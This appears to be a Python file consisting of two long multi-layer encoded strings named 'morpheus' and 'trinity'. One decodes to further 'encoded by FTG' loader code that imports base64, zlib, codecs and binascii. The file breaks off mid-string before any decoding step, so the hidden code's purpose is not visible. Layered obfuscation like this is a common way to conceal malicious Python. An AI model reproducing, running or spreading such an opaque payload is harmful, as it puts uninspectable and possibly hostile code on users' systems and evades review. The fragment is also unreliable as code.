
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NDYzMjUwNmYzODcxNTczNTY2NzU1MjdhNmUyYjM0MzA2YTc5NjM2MjZlNTY3Mjc4NDk2NDY0NTg1YTYxNmQ1Mjc3NmY1ODQ3NDE0OTU0NjQ3NjRhNmM0NzMzNTI2NjZlNGE1NDU0NjE1NDQxNTkzODcxNjI1NDc3NGIyYjY2NzY1ODYxMzQ3YTc1MzM2MjMwN2E0ZjYxNjgzOTQ2NTI3OTZkNTU0NDc3NTkzNjM5MzEyZjM2NGI1NzQ4NDgyYjMyMzEzOTRmNjI1ODZlMzc2NTY2NzIzNTZjMzk2Njc4MzkzOTJmMmIzMjMxMzk1NzcxNjY2NjM3NjIzNzJmMmY2NDZkNmQzNjMyMzg2NjZlNTgzMTM2NTA2NjdhNzQzOTZkMmYzMzcyNTgzMzQyNDgyYjYyNjY2NjY2MzI3NDc1NDgzOTMzMzczNjY2MzYzMzc2MmY3YTM3NTgyZjM2NTEzNDJmNGMzNjMyNmQ3OTJiNDM2ZDM5NTg1Mzc5MmI1OTRmMzk0Nzc0NmI2ZDM2NTI3ODUxMzk2YTM3NTU1MjY0MzkzMzcwNTk2NjcwNTY3NDY0NGQzNjYyMzE1NjUzNmI3NTUyNDgyYjU3NDgzNTM3Mzk2MTM0NTgyYjcxNzg2NTcyNjY2OTYxMzIyYjcwNzYzOTQ2N2EzMzUzNzQ2NDdhMzYzOTcyNTI0ZDM1MmI3NjY0NzY0MTM0NjU2YTc1N2E0ODRkNTY0MzJmNjk2OTc0NTQ1MjcxMmY2MjM2NjI2MTMzNmE2OTM1NzE1MzYyNTg3OTcxNjY1MzU1NmM0ZDMwNGI1MzY1NjY3MTc5NmQ2NjRlNmQ2YjMyMzIzMDdhNGI1NTRhNTc2MTYyMzE0OTM1NjI1YTMzMzQ3MzcwNmI3OTUxMzY1NjQyNzMzMDZjN2E0YjM2NjYzMzMwNmU1NjdhNmQzOTRiMzk2ZTZkNzQ3MzZlNTg0YjJiNmQ1OTUyNTY1NjQyNDUzOTRhMmI2OTJiNjY0ZTY3MzA0ZTQ3MzQ1NjU3NWE3NjcxNjI0YjZmNzE0ZDZhNWE2NTVhNDczMDY0NjU2ZjM3NzU3YTM5NTA1MzMyNDQ2OTVhNzY2MTZlNjk2NTZjNTA1NjM5NGUzNTc5MzM0YjUxNTI2YTU2NjY1MTJiNGQ3MDU3NjE1NTYyMzM0YjYxNGU0OTZjNjI2ZTY4NGQ1ODRjMzY1NTM5NTA0NzY5NjE3NTRlNTIyYjJiNjM0OTZlNzU0NDY0MzE2NjUyNzU0YTZjNzk2ZjMzNDI0YjZkNmI3NDQ1MzEzNzUwMzU3MDcwNDgzMDUwNWEyZjUyMmIyYjMyNzQ2ZjJiNjc2NDJmNDU2NjdhNzA0YzZiMzY1MTU5NGUzNTMwNmM3ODZkNmQzOTU0NDYyZjQ1NjQzNjJmMzU2ODU4Nzg1ODU2NDQ1NjM3NWE3MDYzNGU2YzU1NDc1YTM0NjIzMTQ2NTM1MDUyNTU1ODY2NTUzMzdhNmQ3MDQyMmY0OTUxN2E3MTU5NTM3MjcwNzYzOTJmMzU0YzRjNzY3MjY0NGI2OTQyMmY0NTM5NDg3NjMwNDM1MDY2NTAyYjQ5NjE3OTU1MzkzNjRmNzU3Njc4NTA2MzY4NjY2ZDcxNzI0YTM2NTQ3MjRlNGYzNjMxNzA2MjY5NTg0YTQ5NjU2YjM2Nzk2NDU3NTE1ODY5NjU2MTU4MzQ1ODM1NmM1YTUwNjkyZjdhNGM2MzU0MmIzODY4NzY1NjYxNTM3NjZiNTAyYjU3NzM3NDUwMzgzOTcyNjk3NjUyNTYyZjY2Mzk0NDc2NWE0NjY2NGQzMzM4NTUzODZkNmIzMzZjMzA3NjY4NzE3NDZlNDY3MTY3MzkzNTY2NjI1YTc5N2E3NDYxNDYzNTYyNTQ3NzM1Nzc2NTM2NmI1YTM3N2E0ODMzNDg2OTVhNjg1NDZlNTQ0ZjMwNjc2NjQ3NjMzMTYyMzI0ODZkNzE0ODcxNzE1Mjc0NzE3MTRiNjQyZjZmMzA3NDZkN2E1MDdhNDY0YTU2Mzk3MTQyNzg2MTU2MzQ2YjZiNzc0ZjM3MzA1ODMzNTQ0NzY2NjEzMDRlNjg1MDcwNmQyZjQ1Njg1MzQ1MzQ2MTZjMzM1MjU2NzA0ZDU3NTY2ZTZhNjMzMzMwMzgzOTMzNDc2Yzc2NGM0ZDM5NDczODU1Mzg3NzZhNDIzNzM3NDk0YzcwNmQ3NDQ4NGM2ZjUwMmI2ZTU2NDkzMzMxMzU2YjM0NzQyYjUxNzEzMjQxNWE0MjY2NTI0NjM5Njk0ODczNGY0MTcyMzQ3NDQyNjc2YTZiNzk0MzM4NDE0NDY1NzU3ODU4NzE2MzM2NDQzMTRmNTI1MDRhNGM1MzMwNDcyYjM2NTU3ODM2Njk0Nzc2NDM3NDM3NmMzMTY5NzA3MTJiMzAyZjc5NTU3NDY0NmQ1NDJmNGU0MTQ0MzY1NjU3NmM0YTQzNjY3MjZjNjM2Mjc4NGQ3MTMxNzY1MDQ2MmI3ODU4Mzk2YTUwNjU2MzQxMmY2MTUwNzgzODU5NzA3OTZlNGE2NjMxNGYyYjQ5NDk2NTQ4NGY0MzM0NDI2YjM2Njg2NTc4NzQzMjQxN2E1OTRhNTA3ODRmNGU0NDdhMmI0MzM3NTk3OTY5NmY3NjYzMzM3MjcxNDc2NjdhNjM3NzYzMmI1MDQ1NzkzNDRhNjI2NTRiNTE3YTc5NDEzOTQ5NjIyZjRjNDU2Yjc1NTM1NDM1NDQ2Njc4NGM2YjRhMmI1NjYzMzQzMDQ0NDc3MDY1Nzg1NDUwNGQ2OTc1Mzk0MzM0NDQzOTRiNmU3NDU5NTc2NjU2NmE1MjUwNTIzNTQ4Mzg2ZDRjNjY1MzM5NmI3NzdhNjU2ZTYzNGE0Zjc3MzM2MTMzMzg2OTY2NjE0NTdhNTk2NzJiNjM0NDc2NjM0NzJiMzc0ZjJiNTM3MjY4NTg3NjcwNGE2NTRhMzk0NTQ2MmI2ZTRkNTA0ZjVhNDQ0ZDU4MmY2YTZmNTM3MjZiNjg0ZjY5NjczMDU0NTg1YTJiNDE2NTJiNDM3MTVhNGM3NjZiNzc1MDQ2MzA3MDZlNzM3ODJmMzQ2ODc3NTI2YTcyNzczMjQzNjQ0OTcyNmQ3ODY5NTA1NTQxMmYzNzQ1NjU2YjU0MzQ2NjczNTM1MDRkNmMyZjM4NTQ3YTM5NGMzMDZiMmY0NTY5Nzk0YzJiNmM3ODc5NzI1MzJmNjU3ODUxNzI3OTQ1MmI2NzRjMzc0YzQ0Nzg1MDY5NjY1Mzc2Njc2NDJmNDkzMzczNjc0NDY5Njg0ODY4Njk2NjM3NzI0ZDU1MmI3YTczMzk0Mjc4Nzk2YzY5NDY1MDQxNjIzMjM0NmE3NjcwNDc3NjUxNzczNjYxNDQzOTZiNjI3YTJmNGYzNDM1NGM2NTQ5NDkzNDM1NGMzODU5NDQzODZmNGY0YzM0NWE3YTJmNjY1OTM3NDgzOTRhMzk0YTMxNGI3NTQ1NTA0NTJiNzkyYjZkNTc0YzQzNjEzMDVhNzg0NDc2Njg1ODY0NDQyZjRhNTc0ZTQ1N2EzNzRjMzg1Mjc4NzE0ODM3NTMyZjY3NDQ1OTY3NmYzOTU0MzkyYjM5NmE1MDUyNDQyYjZlNGE3MTY5MmY1NjY1NTM1OTcxNGM1MjYzNTgzNDc4NjYzMTU0NTI1MDYzNTY0ZTY1NWE0NjY1NmUzOTczMzA2YTUwNzA2NzUwNTQ2NjUyNDk1NDZhNTc1MDczNGU3ODdhNjc0YTZlNDQzMzY3NjIzNDUyMzc2ZDY5MmYzNTU0NTE3MDJmNmMzNDY5NGE3YTJiMmY0MTU1NTc2MjZiNmQ0MzM5Nzc1NDZhNzE0MzU4NmU0YTYzNmU3YTQxNDg0NzcwNGU3Mzc1NzU1NjM1NDEzNTUwMzU1ODRmNGQ2NTYzNTY0YjUyNzY2ODQxMmY3YTMzNmY2NTQ3NzY2MzMyNzg3YTRmNDg2MzQ1NDgzNDU1NjU2ZTUwNjQzNDc3NTA0NDRkNDgzMjM3NGEyYjQ5NGQyZjQzNmU0MzZlMzU1NjU3NmY3OTY2NDM3NjY1NTE0YzY1NDYyZjQ2NTg1MzYyNTE3OTM1Mzc3NzMzNjc3MTc0NTIzNDYzNzc3NDc1NDUyYjQ2NTM3OTUwNzU0NjZlNDg0YjYzMzk3Mzc0Mzk1NTZiNTAzMjZiNzI2NjRlNDQ1MzY2NDU0NTZlMzQ3NzQ0MzU0MzY1Nzk0ZDJiNGU0Yzc2MzY0ZDY5NTc3OTRhNjU0MTQ4NzU1NDc4NmY0ODY5NzU0MTQ0MmY1OTcyMzA1YTczNGEzMzU3NTQzNDc3MzQ1MjcyMzg2YTc2NmI0NzRmNjE0OTM0MzQ2ODY0Nzc0MjUwNDcyYjY4NjYzNTQ5MzM2ODM5Mzg1MTY2NmU1MDQ1NTk0MTY2MzI1MTM5Nzg3ODQ5NTQ3NjY5NDE3NTRjNGE0MjY1Mzk2Yzc2NjE1MzQ1NTgyYjY5NGUzNDZhNmE2YTYxNDg0OTRhMzUzNDU0Mzc0NjRkMzg1MjQ4NmY0NTRjN2E0Yzc1Njg3NTQxNGMyZjcwMzc3OTZjNGY1MDM0Njk3YTc1NjUzMjQ4NmEyYjZhMmY0MTU1NjM2YjM5MzE1MzY3NTc2MzQ3Nzg2ZTRmNDY2MzUxNTg0ZTUwNzg3MjY4MmI3NzcwNzg2YzQ3NTQ0ZTMwNzg2OTY2MzU0YTYzNWEzODQ3NWE3OTY2NDU2MjRkNzE3NTQzMzM1YTJiNjg0ZDdhMzYyYjQzNTg3OTQ4NjYzNDZhNzI2OTRmNTA2ZDcwNzgzMzQ3NjMzNTZjNzg0NDU0MmY0MjM3NzM2YTU4Nzc0YjQ5NDI2ZTZiNjc3NjU5NGE2Njc1NmMzNTRmNzU1OTUwMmI1YTRlMzg1YTUyNzc1OTQ4NGU0ZTQxNDgyYjQzNTQ1Mjc2Njc2OTQ4NDk2ZjM3NzM0ZTMxNzQ2YTQ4NjkzNzRhNmUzODZkNjU2Mjc2NzM2NjJmNGQ2ZjUyNjU0YjQ4Mzg0ZDdhNmE3OTRkNjUzMDc2NzQyZjc5NTkzODM0Njk3Mjc5NzA1YTczNjczMzU3Nzc2NDM0Nzk1MDQ0MmI1YTM3Nzg0NDc2NDU0ODM4Njg3MjMyNTE1YTc5NmQ3NjRmNjE2ODQ0NDY0ODJiNzk2ZTM2NTI2ZTUzMmY3NTU4NmY3NjQ3NDE2NzM1NzEyYjZiMzEzMDcxMzI0MzJiNjk2NTQxNDczNzVhNDE1MDM3NjIzMDU3NjY2ODQ2NGY1Mzc4MzA0YTM4MzA0ODZiNjE0ZTc1NjI3NjY5NDY3MzQ0Mzg0NTJiMzI2NTRlNTk2ODY5NDQ2NTU5NDQzODMxNzY2OTczNjg0ZjcyNDYyYjMyNDEyZjZkNjM2NzY2NmY0MTM4NTg0NTQ0NjYzMjczNmY0NjY5NDM2NjQxNTgzODU0Nzk1OTZlNTk2NzM1NzI0NDZiNjY2OTZiNjU3ODQzNjY3OTUwMzQ0ZjM2Njc1MDZmMzAzNDU1MmY3MzY5Mzg1ODZlNDQ2MzZjMzk0NDY4NmUzMzc5NGEzNzUxNzczODRiMzg1MjQ4N2E1NDQyNDY2NjRiNDgzODZhNTAzMTQ2NGQ2Zjc2NmQ0ZDc3NDE0ODJmNmE2ZTQ3NzI1MTc1NzU1NDM2N2E1NzcwNjEzNjUzNzAzMTc2NmQ1YTZlNmI1MDYzNjc2ZTdhNmI1NjM1NzcyZjQzMzg1MTc2NmEyYjU1NmE3NjY0NjMzMjM2NjkzMzQ3NDYyZjQzNDk0ODQ0NWE2ODUwNGM3OTY2MzU0NTZhNjgzMTM3NjczMzczMzM2ODY1Nzk0ZDJmNDkyZjJmNTEyYjc5NzM2Njc2Njk0YTY2NmI1Mjc3NjI1MDMwMzY0ODM2NmY3MzQ3NjMzNjQ4NjYzNDQ4NGY2MzYyNzg0MjJmNGIyYjM4NDM3OTJmNjk1MDM1Nzk0YTJiNmY0YTZjNGE2MzUwMzE0YzYzNTQ2MzZlNjYzMDdhNTA3MTc1NDk2YzZjNTIzMzc4NDg2ZTU2NDk1MjYyNzM2NzJmNDM2NTY1Nzc2NzM0NDg2MTZhNjY0OTQzMzY2YjRiNGI2ZTU3NjYzNDY4NTEzMjYzNGQ1NzM0NmY1NDcwNDMyZjdhMzQ0NTU4NDg2ZjY2NmQ2Zjc2MzI2YjY4NzA3NzU2Mzg2YzY2NGYyYjUyNjM3ODQzNTA1NTZkMzEzMzM4NmEzNjcyNDQzODY1NTQyZjcwMzM2NTRhMzg0MTdhMzAzMjQzNzY2ZTUyNTU2Zjc3NGM3OTcxNzY1NjZkNTg0MzYxMmYzODcwNzgzNTRhMzgzNTM5NGQ1YTM2NDk2YTczNjE2OTQ5NTU1NTRjMzM2NzRkNzI3NDJiMzQ1NDY3NDY0ZjU4NGU1MTcyNzE0NjRlNmYzNzcxNTE2NjdhNDI0ZTM1Njg1MDRjMzc1MjczNjM0YzU1Mzk2NjUyNDE3NjZlNmY2OTcyNDUzNDM3NmM2OTc1N2E2OTc1NTk2MzM4NzEzNjcwMmY3OTQ2NGY2NzUyNzg0Mzc2Njc2ZTJmNTg0YjYzNjc2MzM1NDk3YTc3Mzc1ODc0NTI2NTZjNjEzMzZhNmI3MzU1NmU2MjcyNGY2MjM2NTM0ZDc2NGMyYjVhNzI3NTc3MmY0ZjQ1NjIzNDY2NzI0NzZlNzEyZjUxNzIzMTczNzM3NjM5NTE2ZTc0MzU1NTU4NGE2NjQyNDQ3NzYxMzI0YTJiNmY0ZjM4NmMyZjQzNzQ0YjM0NzI0YTcwMzQyZjM0Njg2YTVhNzE0YzYxMzU3Mjc2NDI2MzU4NTQyYjZjMzA0MjJmNzk0NDY1Nzc0ZDU4NDU1NTMyMzE3NzZjNjMzNTMxNGQzOTU0NDg2YzUxNjM1ODMyNGU1ODQ5NGQzNDUxNTgzNDQxMmIzMzRlNjQ1MTJmNDU1ODRmNTc3MDQzNmU1YTU5NmE2MjM2NGQ2NTczNDQ2NzRmNmI1MjM0NGM2YTY4NjQ1NTMzMzc0YjY2MmYzNDcyMzc0ZTY0NjM2ZTY4NDE0ZjcxNDgzMzUzMzg1OTRjNmM1MjY2Nzg0YjRmNDk0ZjY1NTczNjM2NTQ2MTM0NGM2ZjY1NzM1MTMxMzE1MzU5NzEzNDQyNzYzOTMwMzY2MjZkNjYzNzMxNzA2NjU2NDUyYjZiNzE1MDJiNzAyZjMyNmE2NzY0MzY2NzUyMzQ0ODY0NmI2NjM1MzQ3MjM4Njg0Yzc1N2E3ODQxNTg0YzY1MzQzNzRmNDUzNjU3MzY0NDRkNzM2YTU1NjY1OTZlNjU0ZDRkMzY2ODZkNTM2NzMzMzQ2YTY1NjE0MjJmNzg1ODUwNDc2MzJmNDU0NjY1NGU2ZDZkNzI0NzRmNzk0MzJmNzc0YjM5Njk0ODM4NGU0MjZmNzY2YTQxNGY0YjY1MzY3ODc2N2E0YTczMzA1MzU4MzY0NjRmNzM3NjYxNjM3NjMxNDczODJiNDczNDU2NjM0YzRmNmYzODM2NTg0ZjY4Mzk3NDY0NDYzNjQzNTg2ZDYxNmY0NDM3NmE0ZjcwNTg3OTM3NTI1YTMzNzEzNTUzNjI2OTRjMzk2NTQyNjY0YzMyNmIyYjc4NDMzMzRmNTQ2NjYyMzM0ODYzNzc1NDZjNDU1ODZmNDUzNDU4Mzg0NzJmNTM0NjY1NzA0YzcyNmQ2MzY3NzgzNTU4NDg2ODUyMzkzNjc3NDIzMzRlNDUyZjYxNDI1ODQzNTQyZjQ1MzI2NTc3NjgzNDQ2MzQ0MzQ0Nzk2ODQ0Mzg2ODU0Mzc2ZTMwNzMzNzZhNmU0OTY2Nzg1ODMwMzY2MjY3MzY1NDcwNGE2NDUzNTQzODZhMzUzMjQ3NDg2MTc5NTA2MzUwMzk2NDMxNDg2NTZmNTc0NjdhMzQzMjZmNjE1YTY3NjU1MzZhNzU2MzdhNzk3MTRhNGQ1NjdhMzY2ZDRlNTQ3MjZmNjQ1MjRjNzc0YzJmNjMzNzYxNmU2NzdhNzEyYjc4NzU2NTQ0MzYzMzdhNGY3NjM0NjkyZjY0NDgyYjZhNmU2ZTU2MzMzOTc1N2EyZjRiNDY2NDcyNjY3YTU4NTI0ZTMzNDIzODZlNTI0NDQ4NjE3MDc2NzI0YTYzNzI1MDY5NmQ3NjM3NDc3NDYzNzg0YzM0NzYzNzQ0NzQ1MzZiNzE2NTM1N2E0ZTZjN2E2YTU1NDYzNTQ2NmU2ZjU3Mzk2ZTZhNmE2YjU4NDE0MjM1MzA1OTY2NmYyYjY3NTIzOTQ2NTgzMjQ4NmUzMDcxNGQ0MjMzMzg2Yzc2NjM0NjY2NGE2MzYzNjYyYjQzMzA3NzY3NGM3MTQ4Mzg3Mzc5NDQyYjMwNWE2NDQ0MzE0MzM4NmY3MjcyNGU3OTYyNTIzOTUzNDUzODQ2MmI3ODY2NzE1MTczNGE0YTUyNjY0YzcwNDc3NDY2Njk3NTY4NDY3OTc3NGQzNzYzNGMzNjQ0MmYzNDc2NzczMzM2NGM2ZjRmNjQ2YjRmNTA1MTJmNmI0OTM5NzEzNTUxNDQzMDU1NTc3ODc4NTQ2YjMyNjI1MTQ1NjI2ZDZkNjU3NzQ5MmI0YzY2NzM3OTQzMzMzMzQ0MmY2YTJmNDczNDQyMzg3NjUxNWE3OTQ2NTA2ZDQ5NzcyZjM2NmI0NTZmNDgzMjQ2Mzk0MTQ4MzUzMDMwNjI2YTY4MzI2ZjYyMzk0NDQ4MzM3MTQ2NmU1NTczMzU2ZjM2Mzg3ODUwNTU1MTMzNjUzOTc4MzM1NDY4Nzc2NjQ5NTMyZjZmNmYzNTQyNGM3MjQyNTE2NDJiNmQyYjYzNDk3MzM0NDM1YTM5Njg2NjM5NDIyYjUzMzM0YTY5NDg2MTUwNmQ2NjY4MzczOTUwMmI2MzUxNjk3NDJmNTU1MDc4NGEyYjVhNzI3MDRmNDI1MTM1Nzc1ODUzNDY1MDc3NjUyZjZlMzM0NjJmNDE1ODcwNjc0ODMyMzUyZjY5NDgzOTY2NTQ0YTY2NzE1NDQyNmU2YzUwNjM2NjMwNGQ2Njc5NDQzNzU1NzkzNzQ5NGY2NDU5Njk0YTcwNTQ2ZjZlNzczMTJiNjI3NTQ5MmI2NDU1NWEzMTcyMzY0ODM3NzQ0ZDc4MzQ3ODZhNGI2NDZjMzk0YzM2NmMzMTc5NmY0MjM3NmM2NTcwNmE3YTYzNjI0YzZhNTc1MjY4MzM3MDZkNzE3NzRjNzg0NjRmNzU3ODc4NDQ1MDU1NDEzODM4MzEzMTMwNDk2ODJiNzc1MDY1MmY1NDU2NzA0YTY1NTUzMTMxNTc0MTc2M'
trinity = 'mD2MGplAzL1ZGpjZmR0BQZ0ZmR0BQWzAmN3BQMuAGN3AGMuA2R0Lwp1ZmN2AwH3ZmV0AQHmAzL2MGL5AQZ2AwEzZmZ0ZGH4Amx2BGEzAmN2AQp3ZzL0AmZ4Awt1ZQH3AQpmBGL3ZzLmAwEzZmtlMwL1Amp2MGMuATL2AGLkAQR0MwMzATH2MQWzATH0ZmWvAmR3ZmEzAGVlMwWvAzHmBQZ3ZmV3AGHkZmx0AQH4AzL3ZmZ2AQZ3ZwZ2AmD1ZwLmAwVmBGEvAzD0AGHkZzL0ZmL0Amt2ZGH4ATVmBGquZzLmAGp5A2R1BQZ2ATR3AwHkAzHmAmZ5AmD2AQZ3AQD2ZmH4AzH1ZmL0AGR2ZwH2AmR1BGp3A2R2LwL3AQLmZGZjATD1AQZ5AzDmBQH2Zmx2BGH5AGNmAmMyAmLmAmEzAwD1AQDlAwx1ZGD0AGD2MwHjAwt3BQZ5AQV0Mwp5AQL2AwEzAwR2BGZ3ZmHmZGD0Zmp3LGMyAGt1BQLmZmtlLwMzAGH0BGZ5AGV0BQMuA2RmZQD5AwZ0ZmL2A2R2MGL1AwtmZmZ3AJRmAQMyAwx1ZQL1Awp2BQZ5AwR1BGEyZzV2MGL1AmD0AwZ0AQx0LmH4ATHmZmEwAGH3AGLmAwx0BQZ1AQZlLwH1AGL3AmL4AmL3BGD5AQHmZGZ4Awt3LGp5ATRmBQLkAwD1BGp4ZmR0AwpmAGLmZQquAwx3ZwEzAQx3ZGZlAGZ1ZQD2AQt1AGHkZmt2BGH0AzH0AwL2AGR2AwExZzV2BQMvAwxmAmZ2ZmV2BGH4AGR2Awp4AQDmAGDlAwD2MGEzAwHlMwHlZmZ3ZGEwAzZmZmMyAzD0AQpkAwL0BGp3ZmL3ZGpjZmH3BGp3ATZlMwpjAGD3AwD1AwH2BGEwAwt2MQDkAGtmAGIuAzHmAQMyAGH0BQWvAQR3AwH4AmZmAmL5AGN2AGZjAmL1AGDkAGL3AmL2AzL0MQZ4ATRmAQD2Zmt2LwEzZzV3AwEwZmN1ZQL4AQZ2AwWzAmp1AQZ2ZmZlLwD1AQpmAmMzZzV0BGL1ZzV2AmH0ZmL0ZGZ2Awt3Awp5AGpmAwp3AGH0BQZ2ZmV3ZmMvAGD3AmplZmt0BGZlZzV1BQH4AQt2AQpmZmx2AwMzAQHlLwL3ZmV3ZmLkZmL0AGp2Awt1ZmZ2AGV0LGZlAwH2MwH3Zmx0ZwZmAQxlLwZ2Amx1BQL5AmV2Lwp0AwR2AwWzAQx0LmZ0AQD2Mwp5AzH2MGIuAwRmAwH4AGZ2ZwWvAzL0MwL1AwL3ZmZ1Zmt2AmMyATV2AQL2Zmp0AGWzAmx1ZQLmAQx0MGZkATZ2ZwMzAGNmAwZjATD2LmZ0AzLmZwL4ZzV3BGEvAmRmBGZ3AzDlLwquAQt2MQL0AQx3AGL1ZmD3ZGD4AGZlMwEzAGZ0BQHjAmpmAQZ4ATRlMwp3Zmp3AmZ0Awx0LGp1AQD2MwquA2R0AwD4AQH0ZGZ2ZmD3ZGExAQtmAGZkZzL0LwpmAGR2BQZ3AmZ3AQpmAmt3ZQH1AGtmAwL2A2R3AGZ4AGD3BQMyAmZ0BGWzAQZ3AGL3ATZmZGp4Zmx3AGH1ZmLmBGL0AmN3ZGWzAGp0MGp1AzHmZmHmZmRmAQp2AzDmAwL1ATH3LGplATD0MwMzAGNmZmZ3ZzLmAmL2AGN2LGZjAzZmAQWvAGV3BGquAzZ0MGMzAGH2LmpjAmD2AmHmAzRmBGDkAGR1AQL0Amp0BGplZmp0MwD2ZmxmZwMxAzL3ZGEwAwx0LwL4ZmV0MQH4AGD1AmD1AGp0AQH4ZzV2AwL5ZmL1BGp3AGR2MwWzAmH3ZQWvZmt2BGZ2AmL0ZwZ3AmZmAQquZmt1ZmMuAGRlLwWzAwV3AGMzAwt2AGL0AwV3BGp2ATH0MGMvAGD2MwZjAGt2LGD1AGD1ZGH3Amp3ZmMzZmD0Lmp1Zmx1LGp1Awx2LwH4AwZ1Zwp4AGt2ZwMzZmp1ZmL2Awt0AQH4AGx1ZwD2AwR2Zwp3AGx3ZGp1Awp1LGZjAGt2LwZlATD3ZmMzAzH0BGMxAQt1AQWzAwH0BQEyAGNmAmEzAQL0ZGWzZmR3BQH4ATRmAQH4AGx1BQZmAzV0BQp3A2RmZQH0Awp1BGL2AmxmAwpmAmH0AGD4AmD0LGMuA2R0BGHlAmHlMwZmAQZ3ZGEzAwp2ZmHkAmHmAwH0AmL0LmHlAmZlMwD1ZmR2AwD4AGDmZQD0AQH2MGMwZzV2AQL1Awx3AmL2AmD0ZmMvAzD3AGD4ZmxmZGMyAQZmZwZ5AQZmAmHkAmt2MwD0ZmplMwH2AzH0MGD0Zmp2MQZmZmH0ZmLmZmH3AQEwAmVmAmWvATV3BQD5A2R2MGL0Awp2AGHmAmt3AmMzAwLmAmMzAGN0BQMzAwH2ZGLmAmN3ZQpjAQV2LmpjA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